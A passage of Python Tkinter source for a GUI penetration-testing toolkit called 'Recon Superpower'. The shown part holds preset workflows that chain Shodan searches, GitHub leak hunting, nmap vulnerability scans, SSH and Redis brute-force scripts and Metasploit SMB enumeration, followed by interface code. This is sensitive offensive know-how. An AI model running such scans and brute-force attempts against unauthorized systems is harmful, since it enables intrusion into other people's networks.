                    {"tool": "shodan", "name": "Database Port Search", "config": {"search_type": "search", "query": "ip:[TARGET_IP] port:27017,5984,6379,9200"}},
                    {"tool": "githarvester", "name": "NoSQL Connection Leaks", "config": {"query": "[TARGET_DOMAIN] mongodb OR mongoose OR redis connection", "sort": "new"}}
                ],
                "active_steps": [
                    {"tool": "nmap", "name": "NoSQL Port Scan", "config": {"scan_type": "SYN", "ports": "5984,6379,7474,7687,8086,8091,9042,9200,9300,27017,27018,27019,28017,29015", "timing": "T4", "scripts": "mongodb-info,redis-info,couchdb-stats"}},
                    {"tool": "nmap", "name": "MongoDB Enumeration", "config": {"scan_type": "SYN", "ports": "27017", "timing": "T4", "scripts": "mongodb-info,mongodb-databases"}},
                    {"tool": "nmap", "name": "Redis Enumeration", "config": {"scan_type": "SYN", "ports": "6379", "timing": "T4", "scripts": "redis-info,redis-brute"}},
                    {"tool": "nmap", "name": "Elasticsearch Enumeration", "config": {"scan_type": "SYN", "ports": "9200,9300", "timing": "T4", "scripts": "http-headers"}}
                ]
            },
            "privilege_escalation_audit": {
                "name": "Privilege Escalation Audit",
                "description": "Identify privilege escalation vectors",
                "passive_steps": [
                    {"tool": "shodan", "name": "Service Intelligence", "config": {"search_type": "host", "query": "[TARGET_IP]"}}
                ],
                "active_steps": [
                    {"tool": "nmap", "name": "Service Enumeration", "config": {"scan_type": "SYN", "ports": "21,22,23,25,53,80,110,135,139,143,443,445,993,995,1433,3306,3389,5432,5900,8080", "timing": "T4", "scripts": "default,version,vuln"}},
                    {"tool": "enum4linux", "name": "Windows Privilege Audit", "config": {"all_enum": True}},
                    {"tool": "metasploit", "name": "SMB Session Enum", "config": {"module": "auxiliary/scanner/smb/smb_enumusers", "threads": "10"}},
                    {"tool": "nmap", "name": "Sudo Exploitation Check", "config": {"scan_type": "SYN", "ports": "22", "timing": "T4", "scripts": "ssh-brute"}}
                ]
            },
            "supply_chain_assessment": {
                "name": "Supply Chain Security Assessment",
                "description": "Third-party and supply chain security audit",
                "passive_steps": [
                    {"tool": "shodan", "name": "Third-Party Services", "config": {"search_type": "search", "query": "hostname:[TARGET_DOMAIN]"}},
                    {"tool": "githarvester", "name": "Dependency Leaks", "config": {"query": "[TARGET_DOMAIN] package.json OR requirements.txt OR Gemfile", "sort": "new"}},
                    {"tool": "githarvester", "name": "CI/CD Pipeline Leaks", "config": {"query": "[TARGET_DOMAIN] .github/workflows OR gitlab-ci OR jenkins", "sort": "new"}}
                ],
                "active_steps": [
                    {"tool": "nmap", "name": "External Service Scan", "config": {"scan_type": "SYN", "ports": "80,443,8080,8443", "timing": "T4", "scripts": "http-headers,ssl-cert"}},
                    {"tool": "gobuster", "name": "Third-Party Endpoint Discovery", "config": {"mode": "dir", "wordlist": "/usr/share/seclists/Discovery/Web-Content/common.txt", "threads": "30"}},
                    {"tool": "nikto", "name": "Web Security Scan", "config": {"port": "443", "ssl": True, "tuning": "x"}}
                ]
            },
            "compliance_baseline": {
                "name": "Security Compliance Baseline",
                "description": "General security compliance baseline check",
                "passive_steps": [
                    {"tool": "shodan", "name": "External Exposure Analysis", "config": {"search_type": "host", "query": "[TARGET_IP]"}},
                    {"tool": "shodan", "name": "Vulnerability Intelligence", "config": {"search_type": "search", "query": "ip:[TARGET_IP] vuln:CVE"}}
                ],
                "active_steps": [
                    {"tool": "nmap", "name": "Full Port Scan", "config": {"scan_type": "SYN", "ports": "1-65535", "timing": "T4"}},
                    {"tool": "nmap", "name": "Vulnerability Scan", "config": {"scan_type": "SYN", "ports": "1-10000", "timing": "T4", "scripts": "vuln"}},
                    {"tool": "nmap", "name": "SSL/TLS Compliance", "config": {"scan_type": "SYN", "ports": "443,8443", "timing": "T4", "scripts": "ssl-enum-ciphers,ssl-cert"}},
                    {"tool": "nikto", "name": "Web Security Baseline", "config": {"port": "443", "ssl": True, "tuning": "x"}},
                    {"tool": "enum4linux", "name": "Windows Security Baseline", "config": {"all_enum": True}}
                ]
            },
            "shadow_it_discovery": {
                "name": "Shadow IT Discovery",
                "description": "Discover unauthorized IT assets and services",
                "passive_steps": [
                    {"tool": "shodan", "name": "Organization Asset Search", "config": {"search_type": "search", "query": "org:[TARGET_ORG]"}},
                    {"tool": "shodan", "name": "SSL Certificate Discovery", "config": {"search_type": "search", "query": "ssl.cert.subject.o:[TARGET_ORG]"}},
                    {"tool": "shodan", "name": "Cloud Asset Discovery", "config": {"search_type": "search", "query": "[TARGET_ORG] cloud:aws OR cloud:azure OR cloud:gcp"}},
                    {"tool": "githarvester", "name": "Unauthorized Repo Search", "config": {"query": "[TARGET_ORG]", "sort": "new"}}
                ],
                "active_steps": [
                    {"tool": "dnsrecon", "name": "DNS Enumeration", "config": {"scan_type": "std"}},
                    {"tool": "dnsrecon", "name": "Subdomain Discovery", "config": {"scan_type": "brt", "wordlist": "/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt"}},
                    {"tool": "nmap", "name": "Service Discovery", "config": {"scan_type": "SYN", "ports": "21,22,80,443,3389,8080,8443", "timing": "T4"}}
                ]
            }
        }

        # Workflow execution state
        self.current_workflow = None
        self.workflow_running = False
        self.workflow_step_index = 0
        self.workflow_results = {}
        self.workflow_target = None

        #Load configuration and history
        self.load_config()
        self.load_history()

        # Load application icon and logo
        self.load_app_icon()

        self.setup_ui()
        self.setup_keyboard_shortcuts()

        # Restore last session settings
        self.restore_last_session()

    def load_config(self):
        """Load user configuration from file."""
        default_config = {
            "window_geometry": "1400x900",
            "timeout": 3600,
            "max_output_lines": 10000,
            "auto_save": False,
            "theme": "dark"
        }

        if self.config_file.exists():
            try:
                with open(self.config_file, 'r') as f:
                    self.config = {**default_config, **json.load(f)}
            except (json.JSONDecodeError, IOError):
                self.config = default_config
        else:
            self.config = default_config

    def save_config(self):
        """Save current configuration to file."""
        try:
            self.config["window_geometry"] = self.root.geometry()
            with open(self.config_file, 'w') as f:
                json.dump(self.config, f, indent=2)
        except IOError:
            pass  # Silently fail if unable to save

    def load_history(self):
        """Load command and target history."""
        if self.history_file.exists():
            try:
                with open(self.history_file, 'r') as f:
                    history_data = json.load(f)
                    self.recent_targets = deque(history_data.get("targets", []), maxlen=20)
                    self.recent_urls = deque(history_data.get("urls", []), maxlen=20)
                    self.command_history = deque(history_data.get("commands", []), maxlen=50)
            except (json.JSONDecodeError, IOError):
                pass  # Start with empty history if file is corrupted

    def save_history(self):
        """Save command and target history."""
        try:
            history_data = {
                "targets": list(self.recent_targets),
                "urls": list(self.recent_urls),
                "commands": list(self.command_history)
            }
            with open(self.history_file, 'w') as f:
                json.dump(history_data, f, indent=2)
        except IOError:
            pass  # Silently fail if unable to save

    def add_to_history(self, target=None, url=None, command=None):
        """Add items to history, avoiding duplicates."""
        if target and target not in self.recent_targets:
            self.recent_targets.appendleft(target)
        if url and url not in self.recent_urls:
            self.recent_urls.appendleft(url)
        if command:
            cmd_str = ' '.join(command) if isinstance(command, list) else command
            if cmd_str not in self.command_history:
                self.command_history.appendleft(cmd_str)
        self.save_history()

    def restore_last_session(self):
        """Restore window geometry and settings from last session."""
        if "window_geometry" in self.config:
            try:
                self.root.geometry(self.config["window_geometry"])
            except (tk.TclError, ValueError, KeyError):
                pass  # Use default if restoration fails

    def load_app_icon(self):
        """Load and set the application icon."""
        self.app_icon = None
        self.app_logo = None
        self.app_logo_small = None

        # Get the directory where the script is located
        script_dir = Path(__file__).parent.resolve()
        icon_path = script_dir / "icon.svg"
        logo_path = script_dir / "logo.svg"

        # Try to load SVG with cairosvg + PIL
        if HAS_PIL and HAS_CAIROSVG and icon_path.exists():
            try:
                # Convert SVG to PNG in memory
                png_data = cairosvg.svg2png(url=str(icon_path), output_width=64, output_height=64)
                image = Image.open(io.BytesIO(png_data))
                self.app_icon = ImageTk.PhotoImage(image)
                self.root.iconphoto(True, self.app_icon)

                # Load larger logo for display
                if logo_path.exists():
                    logo_png = cairosvg.svg2png(url=str(logo_path), output_width=80, output_height=80)
                    logo_image = Image.open(io.BytesIO(logo_png))
                    self.app_logo = ImageTk.PhotoImage(logo_image)

                    # Smaller version for title bar
                    logo_small_png = cairosvg.svg2png(url=str(logo_path), output_width=50, output_height=50)
                    logo_small_image = Image.open(io.BytesIO(logo_small_png))
                    self.app_logo_small = ImageTk.PhotoImage(logo_small_image)
            except Exception:
                pass  # Fall through to fallback

        # Try loading PNG versions if they exist
        if self.app_icon is None and HAS_PIL:
            png_icon_path = script_dir / "icon.png"
            if png_icon_path.exists():
                try:
                    image = Image.open(png_icon_path)
                    image = image.resize((64, 64), Image.Resampling.LANCZOS)
                    self.app_icon = ImageTk.PhotoImage(image)
                    self.root.iconphoto(True, self.app_icon)
                except Exception:
                    pass

        # Create a simple programmatic icon as fallback
        if self.app_icon is None:
            try:
                # Create a simple 32x32 icon using PhotoImage
                self.app_icon = tk.PhotoImage(width=32, height=32)
                # Draw a simple multi-tool shape with Monokai colors
                for y in range(32):
                    for x in range(32):
                        # Background
                        color = "#272822"
                        # Center pivot (green circle)
                        dx, dy = x - 16, y - 16
                        dist = (dx*dx + dy*dy) ** 0.5
                        if dist < 5:
                            color = "#A6E22E"
                        # Tool blades extending from center
                        elif 5 <= dist <= 14:
                            angle = abs(dx) + abs(dy)
                            if (x == 16 and y < 16) or (y == 16 and x > 16) or \
                               (x == 16 and y > 16) or (y == 16 and x < 16):
                                color = "#66D9EF"
                            elif abs(x - y) < 2 or abs(x + y - 32) < 2:
                                color = "#F92672"
                        self.app_icon.put(color, (x, y))
                self.root.iconphoto(True, self.app_icon)
            except Exception:
                pass  # Give up on icon if this fails too

    def show_about_dialog(self):
        """Show the About dialog with logo."""
        about_window = tk.Toplevel(self.root)
        about_window.title("About Recon Superpower")
        about_window.geometry("450x550")
        about_window.configure(bg=self.bg_primary)
        about_window.resizable(False, False)
        about_window.transient(self.root)
        about_window.grab_set()

        # Center the window
        about_window.update_idletasks()
        x = (about_window.winfo_screenwidth() - 450) // 2
        y = (about_window.winfo_screenheight() - 550) // 2
        about_window.geometry(f"+{x}+{y}")

        # Logo display
        if self.app_logo:
            logo_label = tk.Label(about_window, image=self.app_logo, bg=self.bg_primary)
            logo_label.pack(pady=(30, 10))
        else:
            # Text fallback
            logo_text = tk.Label(
                about_window,
                text="🛠️",
                font=("Courier", 48),
                fg=self.accent_green,
                bg=self.bg_primary
            )
            logo_text.pack(pady=(30, 10))

        # Title
        title = tk.Label(
            about_window,
            text="RECON SUPERPOWER",
            font=("Courier", 20, "bold"),
            fg=self.accent_green,
            bg=self.bg_primary
        )
        title.pack(pady=(10, 5))

        # Version
        version = tk.Label(
            about_window,
            text="Version 3.1",
            font=("Courier", 12),
            fg=self.accent_cyan,
            bg=self.bg_primary
        )
        version.pack()

        # Description
        desc = tk.Label(
            about_window,
            text="Professional Security Reconnaissance Toolkit",
            font=("Courier", 10),
            fg=self.text_color,
            bg=self.bg_primary,
            wraplength=380
        )
        desc.pack(pady=(20, 10))

        # Features
        features_frame = tk.Frame(about_window, bg=self.bg_secondary, padx=20, pady=15)
        features_frame.pack(fill=tk.X, padx=30, pady=10)

        features = [
            "🔍 12 Integrated Security Tools",
            "🔄 30 Automated Workflows",
            "🐚 Shell Generator & Encoders",
            "🎨 Monokai Terminal Theme",
            "📊 Real-time Output Display"
        ]

        for feature in features:
            f_label = tk.Label(
                features_frame,
                text=feature,
                font=("Courier", 9),
                fg=self.text_color,
                bg=self.bg_secondary,
                anchor=tk.W
            )
            f_label.pack(anchor=tk.W, pady=2)

        # Disclaimer
        disclaimer = tk.Label(
            about_window,
            text="⚠️ For Authorized Security Testing Only",
            font=("Courier", 9, "bold"),
            fg=self.accent_orange,
            bg=self.bg_primary
        )
        disclaimer.pack(pady=(20, 10))

        # Close button
        close_btn = tk.Button(
            about_window,
            text="Close",
            font=("Courier", 10, "bold"),
            fg=self.bg_primary,
            bg=self.accent_green,
            activebackground=self.accent_cyan,
            relief=tk.FLAT,
            padx=30,
            pady=5,
            command=about_window.destroy
        )
        close_btn.pack(pady=20)

    def setup_keyboard_shortcuts(self):
        """Setup keyboard shortcuts for common operations."""
        self.root.bind('<Control-r>', lambda e: self.run_scan())
        self.root.bind('<Control-s>', lambda e: self.save_output())
        self.root.bind('<Control-l>', lambda e: self.clear_output())
        self.root.bind('<Control-f>', lambda e: self.show_search_dialog())
        self.root.bind('<Control-c>', lambda e: self.copy_selection())
        self.root.bind('<Control-q>', lambda e: self.quit_app())
        self.root.bind('<Escape>', lambda e: self.stop_scan() if self.is_running else None)
        self.root.protocol("WM_DELETE_WINDOW", self.quit_app)

    def quit_app(self):
        """Clean exit with config save."""
        self.save_config()
        self.save_history()
        self.root.quit()

    def setup_ui(self):
        # Title Bar with Logo
        title_frame = tk.Frame(self.root, bg=self.bg_primary, height=80)
        title_frame.pack(fill=tk.X, padx=20, pady=(20, 10))
        title_frame.pack_propagate(False)

        # Left side - Logo
        logo_frame = tk.Frame(title_frame, bg=self.bg_primary)
        logo_frame.pack(side=tk.LEFT, padx=(10, 20))

        if self.app_logo_small:
            logo_label = tk.Label(logo_frame, image=self.app_logo_small, bg=self.bg_primary)
            logo_label.pack()
            # Make logo clickable for About dialog
            logo_label.bind('<Button-1>', lambda e: self.show_about_dialog())
            logo_label.configure(cursor="hand2")
        else:
            # Fallback text logo
            logo_text = tk.Label(
                logo_frame,
                text="🛠️",
                font=("Courier", 32),
                fg=self.accent_green,
                bg=self.bg_primary,
                cursor="hand2"
            )
            logo_text.pack()
            logo_text.bind('<Button-1>', lambda e: self.show_about_dialog())

        # Center - Title and subtitle
        center_frame = tk.Frame(title_frame, bg=self.bg_primary)
        center_frame.pack(side=tk.LEFT, expand=True)

        title_label = tk.Label(
            center_frame,
            text="⚡ THE RECON SUPERPOWER ⚡",
            font=("Courier", 28, "bold"),
            fg=self.accent_green,
            bg=self.bg_primary
        )
        title_label.pack(side=tk.TOP)

        subtitle_label = tk.Label(
            center_frame,
            text="[ AUTHORIZED SECURITY TESTING ONLY ]",
            font=("Courier", 10),
            fg=self.accent_cyan,
            bg=self.bg_primary
        )
        subtitle_label.pack(side=tk.TOP)

        # Right side - About button and version
        right_frame = tk.Frame(title_frame, bg=self.bg_primary)
        right_frame.pack(side=tk.RIGHT, padx=(20, 10))

        version_label = tk.Label(
            right_frame,
            text="v3.1",
            font=("Courier", 10, "bold"),
            fg=self.accent_purple,
            bg=self.bg_primary
        )
        version_label.pack(side=tk.TOP)

        about_btn = tk.Button(
            right_frame,
            text="ℹ️ About",
            font=("Courier", 9),
            fg=self.text_color,
            bg=self.bg_secondary,
            activebackground=self.bg_tertiary,
            activeforeground=self.accent_green,
            relief=tk.FLAT,
            padx=10,
            pady=2,
            command=self.show_about_dialog
        )
        about_btn.pack(side=tk.TOP, pady=(5, 0))

        # Main container
        main_container = tk.Frame(self.root, bg=self.bg_primary)
        main_container.pack(fill=tk.BOTH, expand=True, padx=20, pady=10)

        # Left panel - Tool selection sidebar + Tool configuration
        left_panel = tk.Frame(main_container, bg=self.bg_secondary, width=520)
        left_panel.pack(side=tk.LEFT, fill=tk.BOTH, padx=(0, 10), pady=0)
        left_panel.pack_propagate(False)

        # Tool selector sidebar (narrower)
        sidebar_frame = tk.Frame(left_panel, bg=self.bg_tertiary, width=140)
        sidebar_frame.pack(side=tk.LEFT, fill=tk.Y, padx=0, pady=0)
        sidebar_frame.pack_propagate(False)

        # Sidebar header
        sidebar_header = tk.Label(
            sidebar_frame,
            text="TOOLS",
            font=("Courier", 10, "bold"),
            fg=self.accent_cyan,
            bg=self.bg_tertiary,
            pady=10
        )
        sidebar_header.pack(fill=tk.X)

        # Scrollable tool list
        tool_list_canvas = tk.Canvas(sidebar_frame, bg=self.bg_tertiary, highlightthickness=0)
        scrollbar = tk.Scrollbar(sidebar_frame, orient="vertical", command=tool_list_canvas.yview)
        tool_list_frame = tk.Frame(tool_list_canvas, bg=self.bg_tertiary)

        tool_list_frame.bind(
            "<Configure>",
            lambda e: tool_list_canvas.configure(scrollregion=tool_list_canvas.bbox("all"))
        )

        tool_list_canvas.create_window((0, 0), window=tool_list_frame, anchor="nw")
        tool_list_canvas.configure(yscrollcommand=scrollbar.set)

        tool_list_canvas.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)

        # Tool buttons in sidebar
        self.tool_buttons = {}
        tools = [
            ("nmap", "🔍 Nmap"),
            ("gobuster", "📁 Gobuster"),
            ("nikto", "🔐 Nikto"),
            ("sqlmap", "💉 SQLmap"),
            ("metasploit", "💥 Metasploit"),
            ("shodan", "🌐 Shodan"),
            ("dnsrecon", "📡 DNSrecon"),
            ("enum4linux", "🖥️ enum4linux"),
            ("githarvester", "🔎 GitHarvester"),
            ("feroxbuster", "🦀 feroxbuster"),
            ("awsbucket", "☁️ AWS S3"),
            ("tcpdump", "📦 TCPdump"),
            ("shellz", "🐚 Shellz"),
            ("encoders", "🔐 Encoders"),
            ("decoders", "🔓 Decoders"),
            ("lolol", "🎭 LOLOL"),
            ("workflows", "🔄 Workflows"),
            ("help", "❓ Help"),
            ("settings", "⚙️ Settings")
        ]

        for tool_id, tool_name in tools:
            btn = tk.Button(
                tool_list_frame,
                text=tool_name,
                font=("Courier", 9, "bold"),
                bg=self.bg_tertiary,
                fg=self.text_color,
                activebackground=self.bg_primary,
                activeforeground=self.accent_green,
                relief=tk.FLAT,
                anchor=tk.W,
                padx=10,
                pady=12,
                cursor="hand2",
                borderwidth=0,
                highlightthickness=0,
                command=lambda t=tool_id: self.switch_tool(t)
            )
            btn.pack(fill=tk.X, padx=2, pady=2)
            self.tool_buttons[tool_id] = btn
            
            # Add hover effects
            btn.bind("<Enter>", lambda e, b=btn: b.config(bg=self.bg_primary) if b['bg'] != self.bg_primary else None)
            btn.bind("<Leave>", lambda e, b=btn, t=tool_id: b.config(bg=self.bg_primary if self.current_tool == t else self.bg_tertiary))

        # Tool configuration container (right side of left panel)
        self.tool_container = tk.Frame(left_panel, bg=self.bg_secondary)
        self.tool_container.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=10, pady=10)

        # Create all tool configuration frames (but don't pack them yet)
        self.tool_frames["nmap"] = self.create_nmap_tab()
        self.tool_frames["gobuster"] = self.create_gobuster_tab()
        self.tool_frames["nikto"] = self.create_nikto_tab()
        self.tool_frames["sqlmap"] = self.create_sqlmap_tab()
        self.tool_frames["metasploit"] = self.create_metasploit_tab()
        self.tool_frames["shodan"] = self.create_shodan_tab()
        self.tool_frames["dnsrecon"] = self.create_dnsrecon_tab()
        self.tool_frames["enum4linux"] = self.create_enum4linux_tab()
        self.tool_frames["githarvester"] = self.create_githarvester_tab()
        self.tool_frames["feroxbuster"] = self.create_feroxbuster_tab()
        self.tool_frames["awsbucket"] = self.create_awsbucket_tab()
        self.tool_frames["tcpdump"] = self.create_tcpdump_tab()
        self.tool_frames["shellz"] = self.create_shellz_tab()
        self.tool_frames["encoders"] = self.create_encoders_tab()
        self.tool_frames["decoders"] = self.create_decoders_tab()
        self.tool_frames["lolol"] = self.create_lolol_tab()
        self.tool_frames["workflows"] = self.create_workflows_tab()
        self.tool_frames["help"] = self.create_help_tab()
        self.tool_frames["settings"] = self.create_settings_tab()

        # Right panel - Output
        right_panel = tk.Frame(main_container, bg=self.bg_secondary)
        right_panel.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True)

        # Output header
        output_header = tk.Frame(right_panel, bg=self.bg_tertiary, height=40)
        output_header.pack(fill=tk.X, padx=10, pady=(10, 0))
        output_header.pack_propagate(False)

        output_label = tk.Label(
            output_header,
            text="[ CONSOLE OUTPUT ]",
            font=("Courier", 12, "bold"),
            fg=self.accent_cyan,
            bg=self.bg_tertiary
        )
        output_label.pack(side=tk.LEFT, padx=10, pady=8)

        # Control buttons
        self.run_button = tk.Button(
            output_header,
            text="▶ RUN SCAN",
            font=("Courier", 10, "bold"),
            bg=self.accent_green,
            fg=self.bg_primary,
            activebackground=self.accent_cyan,
            relief=tk.FLAT,
            padx=15,
            pady=5,
            cursor="hand2",
            command=self.run_scan
        )
        self.run_button.pack(side=tk.RIGHT, padx=5, pady=5)

        self.stop_button = tk.Button(
            output_header,
            text="⬛ STOP",
            font=("Courier", 10, "bold"),
            bg=self.accent_red,
            fg=self.text_color,
            activebackground="#cc0044",
            relief=tk.FLAT,
            padx=15,
            pady=5,
            cursor="hand2",
            command=self.stop_scan,
            state=tk.DISABLED
        )
        self.stop_button.pack(side=tk.RIGHT, padx=5, pady=5)

        clear_button = tk.Button(
            output_header,
            text="🗑 CLEAR",
            font=("Courier", 10, "bold"),
            bg=self.bg_primary,
            fg=self.text_color,
            activebackground=self.bg_tertiary,
            relief=tk.FLAT,
            padx=15,
            pady=5,
            cursor="hand2",
            command=self.clear_output
        )
        clear_button.pack(side=tk.RIGHT, padx=5, pady=5)

        save_button = tk.Button(
            output_header,
            text="💾 SAVE",
            font=("Courier", 10, "bold"),
            bg=self.bg_primary,
            fg=self.text_color,
            activebackground=self.bg_tertiary,
            relief=tk.FLAT,
            padx=15,
            pady=5,
            cursor="hand2",
            command=self.save_output
        )
        save_button.pack(side=tk.RIGHT, padx=5, pady=5)

        # Additional utility buttons
        export_button = tk.Button(
            output_header,
            text="📤 EXPORT",
            font=("Courier", 10, "bold"),
            bg=self.bg_primary,
            fg=self.text_color,
            activebackground=self.bg_tertiary,
            relief=tk.FLAT,
            padx=15,
            pady=5,
            cursor="hand2",
            command=self.show_export_menu
        )
        export_button.pack(side=tk.RIGHT, padx=5, pady=5)

        search_button = tk.Button(
            output_header,
            text="🔍 SEARCH",
            font=("Courier", 10, "bold"),
            bg=self.bg_primary,
            fg=self.text_color,
            activebackground=self.bg_tertiary,
            relief=tk.FLAT,
            padx=15,
            pady=5,
            cursor="hand2",
            command=self.show_search_dialog
        )
        search_button.pack(side=tk.RIGHT, padx=5, pady=5)

        copy_button = tk.Button(
            output_header,
            text="📋 COPY",
            font=("Courier", 10, "bold"),
            bg=self.bg_primary,
            fg=self.text_color,
            activebackground=self.bg_tertiary,
            relief=tk.FLAT,
            padx=15,
            pady=5,
            cursor="hand2",
            command=self.copy_selection
        )
        copy_button.pack(side=tk.RIGHT, padx=5, pady=5)

        # Output text area
        output_frame = tk.Frame(right_panel, bg=self.bg_primary, highlightthickness=2,
                               highlightbackground=self.accent_green)
        output_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        self.output_text = scrolledtext.ScrolledText(
            output_frame,
            font=("Consolas", 11),
            bg="#1E1E1E",                    # Darker terminal background
            fg=self.text_color,              # Monokai off-white text
            insertbackground=self.accent_green,
            selectbackground=self.accent_yellow,
            selectforeground=self.bg_primary,
            wrap=tk.WORD,
            relief=tk.FLAT,
            padx=12,
            pady=12,
            borderwidth=0
        )
        self.output_text.pack(fill=tk.BOTH, expand=True)

        # Status bar
        status_bar = tk.Frame(self.root, bg=self.bg_tertiary, height=30)
        status_bar.pack(fill=tk.X, side=tk.BOTTOM)
        status_bar.pack_propagate(False)

        self.status_label = tk.Label(
            status_bar,
            text="[ READY ]",
            font=("Courier", 9),
            fg=self.accent_green,
            bg=self.bg_tertiary,
            anchor=tk.W
        )
        self.status_label.pack(side=tk.LEFT, padx=10, pady=5)

        # Initial welcome message
        self.print_banner()

        # Switch to nmap by default
        self.switch_tool("nmap")

    def switch_tool(self, tool_id):
        """Switch between different tool configuration panels."""
        # Hide current tool frame if any
        if self.current_tool and self.current_tool in self.tool_frames:
            self.tool_frames[self.current_tool].pack_forget()

        # Update button colors
        for tid, btn in self.tool_buttons.items():
            if tid == tool_id:
                btn.config(bg=self.bg_primary, fg=self.accent_green)
            else:
                btn.config(bg=self.bg_tertiary, fg=self.text_color)

        # Show selected tool frame
        if tool_id in self.tool_frames:
            self.tool_frames[tool_id].pack(fill=tk.BOTH, expand=True)
            self.current_tool = tool_id
            self.update_status(f"{tool_id.upper()} selected")


    def create_labeled_entry(self, parent, label_text, row, default_value="", width=30):
        label = tk.Label(parent, text=label_text, font=("Courier", 10),
                        fg=self.text_color, bg=self.bg_secondary, anchor=tk.W)
        label.grid(row=row, column=0, sticky=tk.W, padx=10, pady=5)

        entry = tk.Entry(parent, font=("Consolas", 11), bg="#1E1E1E",
                        fg=self.text_color, insertbackground=self.accent_green,
                        relief=tk.FLAT, width=width, highlightthickness=1,
                        highlightbackground=self.bg_tertiary, highlightcolor=self.accent_green)
        entry.grid(row=row, column=1, sticky=tk.EW, padx=10, pady=5)
        entry.insert(0, default_value)

        return entry

    def create_nmap_tab(self):
        frame = tk.Frame(self.tool_container, bg=self.bg_secondary)
        frame.columnconfigure(1, weight=1)

        # Target
        self.nmap_target = self.create_labeled_entry(frame, "Target:", 0, "")

        # Scan type
        label = tk.Label(frame, text="Scan Type:", font=("Courier", 10),
                        fg=self.text_color, bg=self.bg_secondary, anchor=tk.W)
        label.grid(row=1, column=0, sticky=tk.W, padx=10, pady=5)

        self.nmap_scan_type = ttk.Combobox(frame, values=[
            "-sS (TCP SYN Scan)",
            "-sT (TCP Connect Scan)",
            "-sU (UDP Scan)",
            "-sV (Version Detection)",
            "-O (OS Detection)",
            "-A (Aggressive Scan)",
            "-sn (Ping Scan)"
        ], font=("Courier", 9), state="readonly", width=28)
        self.nmap_scan_type.grid(row=1, column=1, sticky=tk.EW, padx=10, pady=5)
        self.nmap_scan_type.current(0)

        # Port range
        self.nmap_ports = self.create_labeled_entry(frame, "Ports:", 2, "1-1000")

        # Timing
        label = tk.Label(frame, text="Timing:", font=("Courier", 10),
                        fg=self.text_color, bg=self.bg_secondary, anchor=tk.W)
        label.grid(row=3, column=0, sticky=tk.W, padx=10, pady=5)

        self.nmap_timing = ttk.Combobox(frame, values=[
            "T0 (Paranoid)",
            "T1 (Sneaky)",
            "T2 (Polite)",
            "T3 (Normal)",
            "T4 (Aggressive)",
            "T5 (Insane)"
        ], font=("Courier", 9), state="readonly", width=28)
        self.nmap_timing.grid(row=3, column=1, sticky=tk.EW, padx=10, pady=5)
        self.nmap_timing.current(3)

        # NSE Scripts (NEW FEATURE)
        label = tk.Label(frame, text="NSE Scripts:", font=("Courier", 10),
                        fg=self.text_color, bg=self.bg_secondary, anchor=tk.W)
        label.grid(row=4, column=0, sticky=tk.W, padx=10, pady=5)

        self.nmap_scripts = ttk.Combobox(frame, values=[
            "(none)",
            "default",
            "vuln (Vulnerability scan)",
            "discovery",
            "auth",
            "broadcast",
            "exploit",
            "safe",
            "version",
            "Custom (enter below)"
        ], font=("Courier", 9), state="readonly", width=28)
        self.nmap_scripts.grid(row=4, column=1, sticky=tk.EW, padx=10, pady=5)
        self.nmap_scripts.current(0)

        # Custom script input
        self.nmap_custom_script = self.create_labeled_entry(frame, "Custom Script:", 5, "")

        # Additional options
        self.nmap_options = self.create_labeled_entry(frame, "Extra Options:", 6, "")

        # Info label
        info_label = tk.Label(
            frame,
            text="\n📡 Network Mapper\nPort scanning & host discovery\n\nExample targets:\n• 192.168.1.1\n• scanme.nmap.org\n• 10.0.0.0/24",
            font=("Courier", 9),
            fg=self.accent_cyan,
            bg=self.bg_secondary,
            justify=tk.LEFT,
            wraplength=320
        )
        info_label.grid(row=7, column=0, columnspan=2, sticky=tk.W, padx=10, pady=20)

        # Cheat Sheet Button
        cheat_btn = tk.Button(
            frame,
            text="📋 VIEW CHEAT SHEET",
            font=("Courier", 9, "bold"),
            bg=self.bg_tertiary,
            fg=self.accent_cyan,
            activebackground=self.accent_cyan,
            activeforeground=self.bg_primary,
            relief=tk.FLAT,
            padx=15,
            pady=8,
            cursor="hand2",
            command=lambda: self.show_cheatsheet("nmap")
        )
        cheat_btn.grid(row=8, column=0, columnspan=2, pady=10)

        return frame

    def create_gobuster_tab(self):
        frame = tk.Frame(self.tool_container, bg=self.bg_secondary)
        frame.columnconfigure(1, weight=1)

        # Target URL
        self.gobuster_url = self.create_labeled_entry(frame, "Target URL:", 0, "http://")

        # Mode
        label = tk.Label(frame, text="Mode:", font=("Courier", 10),
                        fg=self.text_color, bg=self.bg_secondary, anchor=tk.W)
        label.grid(row=1, column=0, sticky=tk.W, padx=10, pady=5)

        self.gobuster_mode = ttk.Combobox(frame, values=[
            "dir (Directory/File)",
            "dns (DNS Subdomain)",
            "vhost (Virtual Host)"
        ], font=("Courier", 9), state="readonly", width=28)
        self.gobuster_mode.grid(row=1, column=1, sticky=tk.EW, padx=10, pady=5)
        self.gobuster_mode.current(0)

        # Wordlist
        label = tk.Label(frame, text="Wordlist:", font=("Courier", 10),
                        fg=self.text_color, bg=self.bg_secondary, anchor=tk.W)
        label.grid(row=2, column=0, sticky=tk.W, padx=10, pady=5)

        wordlist_frame = tk.Frame(frame, bg=self.bg_secondary)
        wordlist_frame.grid(row=2, column=1, sticky=tk.EW, padx=10, pady=5)

        self.gobuster_wordlist = tk.Entry(wordlist_frame, font=("Courier", 10),
                                         bg=self.bg_primary, fg=self.accent_cyan,
                                         insertbackground=self.accent_cyan, relief=tk.FLAT)
        self.gobuster_wordlist.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        self.gobuster_wordlist.insert(0, "/usr/share/wordlists/dirb/common.txt")

        browse_btn = tk.Button(wordlist_frame, text="📂", font=("Courier", 9),
                              bg=self.bg_primary, fg=self.text_color,
                              relief=tk.FLAT, cursor="hand2",
                              command=lambda: self.browse_wordlist(self.gobuster_wordlist))
        browse_btn.pack(side=tk.RIGHT, padx=(5, 0))

        # Threads
        self.gobuster_threads = self.create_labeled_entry(frame, "Threads:", 3, "10")
        # Extensions
        self.gobuster_extensions = self.create_labeled_entry(frame, "Extensions:", 4, "php,html,txt")

        # Additional options
        self.gobuster_options = self.create_labeled_entry(frame, "Extra Options:", 5, "-k")

        # Info label
        info_label = tk.Label(
            frame,
